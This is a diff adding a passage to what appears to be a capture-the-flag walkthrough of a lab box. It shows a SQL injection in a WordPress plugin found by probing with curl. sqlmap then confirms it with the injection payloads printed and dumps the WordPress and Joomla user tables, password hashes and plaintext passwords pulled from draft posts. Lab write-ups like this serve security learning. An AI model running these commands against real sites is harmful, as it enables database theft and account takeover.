@@ -449,3 +449,198 @@ if (isset($_GET['query'])){
 ?> 
 
 ```
+
+- We have a potential `SQL` injection on `lcars` plugin
+  - We can confirm that `lcars` exists
+
+![](./images/6.png)
+
+- Let's try to query it
+```
+└─$ for i in {0..100}; do (echo -n "$i:"; curl -s http://10.10.10.61/wp-content/plugins/lcars/lcars_dbpost.php?query=$i); done | grep .
+0: 
+1:Hello world! 
+2: 
+3:Auto Draft 
+4:Espresso 
+5:Sandwich 
+6:Coffee 
+7:Home 
+8:About 
+9:Contact 
+...
+59: 
+60: 
+61: 
+62: 
+63: 
+64: 
+65: 
+66:Passwords 
+67:Passwords 
+68:Passwords 
+...
+```
+
+- Let's also check `lcars_pdb.php`
+  - But it fails
+```
+└─$ for i in {0..100}; do (echo -n "$i:"; curl -s http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=$i); done | grep . 
+0:<br />
+<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />
+1:<br />
+<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />
+2:<br />
+<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />
+...
+```
+
+- Okay, let's pass the `url` to `sqlmap`
+  - I tried both, but only `lcars_db.php` was successful  
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dbs                                       
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[']_____ ___ ___  {1.7.9#stable}                                                                                                                                                                                                    
+|_ -| . [']     | .'| . |                                                                                                                                                                                                                   
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+...
+GET parameter 'query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
+---
+Parameter: query (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: query=(SELECT (CASE WHEN (9664=9664) THEN 1 ELSE (SELECT 2239 UNION SELECT 5000) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: query=1 AND (SELECT 5185 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(5185=5185,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: query=1 AND (SELECT 4270 FROM (SELECT(SLEEP(5)))CSgv)
+---
+[15:59:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: PHP 5.6.31, Apache 2.4.10
+back-end DBMS: MySQL >= 5.0
+[15:59:40] [INFO] fetching database names
+[15:59:40] [INFO] retrieved: 'information_schema'
+[15:59:40] [INFO] retrieved: 'joomla'
+[15:59:41] [INFO] retrieved: 'joomladb'
+[15:59:41] [INFO] retrieved: 'mysql'
+[15:59:41] [INFO] retrieved: 'performance_schema'
+[15:59:42] [INFO] retrieved: 'sys'
+[15:59:42] [INFO] retrieved: 'wordpress'
+[15:59:42] [INFO] retrieved: 'wordpressdb'
+available databases [8]:
+[*] information_schema
+[*] joomla
+[*] joomladb
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] wordpress
+[*] wordpressdb
+
+```
+
+- Let's dump tables
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress --tables
+...
+Database: wordpress
+[12 tables]
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+
+```
+
+- Let's dump `wp_users`
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_users --dump
+...
+Database: wordpress
+Table: wp_users
+[1 entry]
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+| ID | user_url | user_pass                          | user_email                   | user_login    | user_status | display_name  | user_nicename | user_registered     | user_activation_key |
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+| 1  | <blank>  | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0           | william.riker | william-riker | 2017-09-03 19:20:56 | <blank>             |
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+...
+```
+
+- We can also dump `joomladb` tables
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch  -D joomladb --tables 
+...
+Database: joomladb
+[72 tables]
++-------------------------------+
+| edz2g_assets                  |
+| edz2g_associations            |
+| edz2g_banner_clients          |
+| edz2g_banner_tracks           |
+| edz2g_banners                 |
+| edz2g_categories              |
+...
+
+```
+
+- There are bunch of tables, we only need `edz2g_users`
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch  -D joomladb -T edz2g_users  --dump
+...
+[2 entries]
++-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
+| id  | otep    | email                          | name       | otpKey  | params                                                                                       | block   | password                                                     | username        | sendEmail | activation | resetCount | registerDate        | requireReset | lastResetTime       | lastvisitDate       |
++-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
+| 400 | <blank> | geordi.la.forge@enterprise.htb | Super User | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | 0       | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge | 1         | 0          | 0          | 2017-09-03 19:30:04 | 0            | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 |
+| 401 | <blank> | guinan@enterprise.htb          | Guinan     | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | 0       | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | Guinan          | 0         | <blank>    | 0          | 2017-09-06 12:38:03 | 0            | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 |
++-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
+```
+
+- We also saw posts with passwords
+  - Let's dump them too
+  - There will be bunch of posts, we have to grep the ones we need from the output
+```
+└─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts --dump 
+...
+[16:18:52] [INFO] table 'wordpress.wp_posts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv'
+[16:18:52] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.61'
+
+```
+```
+└─$ grep "password" /home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv
+ID,guid,pinged,to_ping,post_date,post_name,post_type,menu_order,post_title,ping_status,post_author,post_parent,post_status,post_content,post_excerpt,comment_count,post_date_gmt,post_modified,post_password,comment_status,post_mime_type,post_modified_gmt,post_content_filtered
+66,http://enterprise.htb/?p=66,<blank>,<blank>,2017-09-06 15:40:30,<blank>,post,0,Passwords,open,1,0,draft,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,0000-00-00 00:00:00,2017-09-06 15:40:30,<blank>,open,<blank>,2017-09-06 14:40:30,<blank>
+67,http://enterprise.htb/?p=67,<blank>,<blank>,2017-09-06 15:28:35,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,2017-09-06 14:28:35,2017-09-06 15:28:35,<blank>,closed,<blank>,2017-09-06 14:28:35,<blank>
+68,http://enterprise.htb/?p=68,<blank>,<blank>,2017-09-06 15:40:30,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,2017-09-06 14:40:30,2017-09-06 15:40:30,<blank>,closed,<blank>,2017-09-06 14:40:30,<blank>
+```
+```
+└─$ grep "password" /home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv | cut -d',' -f14 | sed 's/\\r\\n\\r\\n/\n/g' | sort -u | grep -v quickly | grep -v post_content
+ 
+enterprisencc170
+u*Z14ru0p#ttj83zS6
+ZD3YxfnSjezg67JZ
+ZxJyhGem4k338S2Y
+```
+
+- So now we have potential creds and usernames, we can try to login to `wordpress` and `joomla`
+
